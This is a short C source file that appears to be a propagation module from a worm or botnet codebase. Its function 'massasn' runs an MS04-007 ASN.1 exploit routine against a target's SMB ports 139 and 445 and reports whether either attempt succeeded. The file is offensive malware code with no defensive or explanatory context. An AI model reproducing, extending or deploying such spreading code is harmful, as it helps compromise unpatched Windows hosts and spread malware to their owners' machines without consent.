
#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_MS04007ASN1
#ifndef NO_MASSASN


BOOL massasn(EXINFO exinfo)
 {
	exinfo.port = 139;
	BOOL bASN1SMBNT = MS04_007_MSASN1_PortedByScriptGod(exinfo);
	exinfo.port = 445;
	BOOL bASN1SMB = MS04_007_MSASN1_PortedByScriptGod(exinfo);
	return bASN1SMB || bASN1SMBNT  ? TRUE : FALSE;
}

#endif
#endif
